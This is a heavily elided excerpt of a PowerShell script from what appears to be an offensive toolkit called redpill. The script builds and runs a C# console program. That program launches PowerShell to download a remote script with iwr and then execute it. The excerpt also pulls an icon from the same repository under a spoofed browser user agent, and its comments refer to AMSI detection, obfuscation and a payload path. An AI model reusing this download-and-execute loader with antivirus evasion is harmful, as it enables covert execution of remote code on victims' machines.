...
.NOTES
   ...
   Remark: Parameter -DemoCmdlet 'string' its only accessible in -uri 'NonExistingCS.cs'
...
.Parameter IconSet
   Accepts arguments: true, false or icon.ico path (default: False)
...
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$DemoCmdlet="https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/test.ps1",
...
$ParseCmdLetAgent = $DemoCmdlet.Split('/')[-1] #test.ps1
...
namespace Console
{
    class Program
    {
        static void Main(string[] args)
        {
           ...
           process.StartInfo.Arguments = `"iwr -Uri $DemoCmdlet -OutFile $ParseCmdLetAgent;powershell -File $ParseCmdLetAgent`";
...
If($Action -ieq "Compile" -or $Action -ieq "Execute")
{
   ...
   #Download script.CS from network URL
   If($Uri -iMatch '^[http(s)]+://')
   {
      ...
      ## Use IWR to download our script.CS to %tmp% location!
   ...
   {
      #[error] OutFile Name => amsi detection!
   ...
   If(Test-Path -Path "$LocalCSPath" -EA SilentlyContinue)
   {
      If($IconSet -ieq "True" -or $IconSet -iMatch '\\')
      {
         ...
         {
            #Download icon from @redpill repo => IF does NOT exist!
            iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/redpillIcon1.ico -OutFile $IconFile -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0" -ErrorAction SilentlyContinue|Unblock-File
         }
   ...
   If($Obfuscate -ieq "True")
   {
      ...
      Else
      {
         #Payload absoluct path sellected!
